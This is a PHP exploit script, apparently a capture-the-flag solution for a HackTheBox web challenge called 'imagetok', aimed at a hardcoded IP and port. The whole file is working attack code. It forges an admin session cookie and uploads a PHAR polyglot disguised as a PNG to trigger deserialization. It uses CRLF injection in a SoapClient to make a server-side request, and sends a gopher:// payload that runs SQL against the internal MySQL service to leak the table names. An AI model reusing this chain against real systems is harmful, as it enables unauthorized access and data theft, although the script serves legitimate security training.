<?php

$host = "167.99.95.121";
$port = 30648;

$phar_model = <<<'EOD'
class ImageModel
{
    public $file;

    public function __construct($file)
    {
        $this->file = new SoapClient(null, array(
            "location" => "http://localhost:80/proxy",
            "uri" => "http://localhost:80/proxy",
            "user_agent" => "clrf-inject\r\n\r\n\r\n\r\n".
                "POST /proxy HTTP/1.1\r\n".
                "Host: admin.imagetok.htb\r\n".
                "Connection: close\r\n".
                "Cookie: PHPSESSID=ADMIN_SESSION;\r\n".
                "Content-Type: application/x-www-form-urlencoded\r\n".
                "Content-Length: CONTENT_LENGTH\r\n\r\n".
                "url=GOPHER_URL".
                "\r\n\r\n\r\n"
        ));
    }
}

$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFile('IMAGE_FILE', 'IMAGE_FILE');
$phar->setStub(file_get_contents('IMAGE_FILE') . ' __HALT_COMPILER(); ?>');
$phar->setMetadata(new ImageModel('none'));
$phar->stopBuffering();
EOD;

function make_phar($model, $image, $session, $gopher) {
    $partials = explode("/_", $gopher);
    $gopher = str_replace("gopher://", "gopher:///", $partials[0]) . "/_" . urlencode($partials[1]);

    $model = str_replace("IMAGE_FILE", $image, $model);
    $model = str_replace("ADMIN_SESSION", $session, $model);
    $model = str_replace("GOPHER_URL", $gopher, $model);
    $model = str_replace("CONTENT_LENGTH", strval(strlen("url=".$gopher)), $model);

    eval($model);
    rename("payload.phar", "payload.png");
}

function make_attribute($session, $key, $value) {
    $temp = explode('.', $session);
    $data = base64_decode(urldecode($temp[0]));
    $signature = urldecode($temp[1]);

    $json = json_decode($data, true);
    $json[$key] = $value;

    $data = base64_encode(json_encode($json));
    return "$data.$signature";
}

function make_request($path="", $cookies=NULL, $filename=NULL) {
    $ch = curl_init("http://".$GLOBALS['host'].":".$GLOBALS['port']."/".$path);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);

    if ($cookies != NULL) {
        curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    }
    
    if ($filename != NULL) {
        $f = curl_file_create($filename);
        $pf = array('uploadFile' => $f);

        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $pf);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    }
    
    $response = curl_exec($ch);
    curl_close($ch);

    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $matches);
    parse_str($matches[1][count($matches[1]) - 1], $cookie);
    
    return $cookie['PHPSESSID'];
}

function make_upload($session, $filename) {
    return make_request("upload", "PHPSESSID=$session;", $filename);
}

function make_access($imgname) {
    return make_request("image/phar:%2f%2f".$imgname."%2ftest.png");
}

function make_admin_session() {
    $session = make_request();
    $session = make_upload($session, 'test.png');
    $session = make_upload($session, 'test.png');
    $session = make_upload($session, 'test.png');
    
    return make_attribute($session, "username", "admin");
}

function make_user_session($username) {
    $session = make_request();
    $payload = make_upload($session, 'payload.png');
    $session = make_upload($payload, 'test.png');
    $session = make_upload($session, 'test.png');

    $temp = explode('.', $payload);
    $data = base64_decode(urldecode($temp[0]));
    $json = json_decode($data, true);

    $imgname = $json["files"][0]["file_name"];
    make_access($imgname);

    $session = make_attribute($session, "username", $username);
    $session = make_request("", "PHPSESSID=$session;");

    $temp = explode('.', $session);
    $data = base64_decode(urldecode($temp[0]));

    print($data."\n");
}

$gopher = "gopher://127.0.0.1:3306/_%a9%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%75%73%65%72%5f%73%46%50%72%4b%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%a6%00%00%00%03%49%4e%53%45%52%54%20%49%4e%54%4f%20%64%62%5f%69%33%4e%36%31%2e%66%69%6c%65%73%28%66%69%6c%65%5f%6e%61%6d%65%2c%20%63%68%65%63%6b%73%75%6d%2c%20%75%73%65%72%6e%61%6d%65%29%20%53%45%4c%45%43%54%20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%74%61%62%6c%65%5f%6e%61%6d%65%29%2c%22%31%22%2c%22%74%61%62%6c%65%73%22%20%46%52%4f%4d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%20%57%48%45%52%45%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%20%3d%20%27%64%62%5f%69%33%4e%36%31%27%01%00%00%00%01";
$session = make_admin_session();

make_phar($phar_model, "test.png", $session, $gopher);
make_user_session("<username>");

?>